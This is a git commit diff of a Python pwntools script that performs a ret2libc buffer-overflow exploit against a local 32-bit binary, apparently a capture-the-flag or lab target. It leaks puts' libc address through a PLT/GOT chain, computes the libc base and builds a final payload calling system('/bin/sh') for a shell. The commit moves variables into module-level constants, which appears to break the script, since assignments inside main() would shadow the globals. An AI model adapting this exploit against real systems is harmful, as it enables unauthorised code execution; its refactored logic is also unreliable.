577911094f881d51c7543a81ebea14a4f0785168
Kaialogen <kaialogen@protonmail.com>
2024-03-30 13:51:22 +0000

    variable changes

--- main_prototype.py
+++ main_prototype.py
@@ -1,6 +1,12 @@
 import struct
 from pwn import process, ELF, context
 
+BUFFER = 132
+PUTS_PLT_ADDRESS, MAIN_ADDRESS, PUTS_GOT_ADDRESS = 0x8048340, 0x804847b, 0x80497ac
+WELCOME_DETECTED, LEAKED_ADDRESS = False, None
+
+
+
 def main():
 
     # Set the binary context
@@ -10,48 +16,38 @@ def main():
     # Start the process
     proc = process()
 
-    # Define offsets and addresses
-    buffer_size = 132
-    puts_plt_address = 0x8048340
-    main_address = 0x804847b
-    puts_got_address = 0x80497ac
-
     # Construct the initial payload
     payload = (
-        b'A' * buffer_size +
-        struct.pack("I", puts_plt_address) +  # puts PLT
-        struct.pack("I", main_address) +      # main address
-        struct.pack("I", puts_got_address)    # puts GOT
+        b'A' * BUFFER +
+        struct.pack("I", PUTS_PLT_ADDRESS) +  # puts PLT
+        struct.pack("I", MAIN_ADDRESS) +      # main address
+        struct.pack("I", PUTS_GOT_ADDRESS)    # puts GOT
     )
 
     # Send the initial payload
     proc.sendline(payload)
-
-    # Initialize variables to track the welcome message
-    welcome_detected = False
-    leaked_address = None
 
     # Process output to leak address
     for _ in range(10):
         try:
             line = proc.recvline()
             print(line)  # Display the line received from the process
-            if welcome_detected and b"Welcome" in line:
-                leaked_address = int.from_bytes(previous_line[:4], byteorder='little')
-                print(f"\033[32mLeaked puts' libc Addr: \033[0m\033[36m{hex(leaked_address)}\033[0m")
-                libc_base_address = leaked_address - 0x731b0  # Offset for libc's puts
+            if WELCOME_DETECTED and b"Welcome" in line:
+                LEAKED_ADDRESS = int.from_bytes(previous_line[:4], byteorder='little')
+                print(f"\033[32mLeaked puts' libc Addr: \033[0m\033[36m{hex(LEAKED_ADDRESS)}\033[0m")
+                libc_base_address = LEAKED_ADDRESS - 0x731b0  # Offset for libc's puts
                 print(f"\033[32mLibc base Addr: \033[0m\033[36m{hex(libc_base_address)}\033[0m")
                 break
             if b"Welcome" in line:
-                welcome_detected = True
+                WELCOME_DETECTED = True
             previous_line = line
         except EOFError:
             break
 
     # Construct and send the final payload if an address was leaked
-    if leaked_address:
+    if LEAKED_ADDRESS:
         final_payload = (
-            b'A' * buffer_size +
+            b'A' * BUFFER +
             struct.pack("I", libc_base_address + 0x4c830) +  # libc system offset
             struct.pack("I", libc_base_address + 0x3c130) +  # libc exit offset
             struct.pack("I", libc_base_address + 0x1b5fc8)   # libc /bin/sh offset
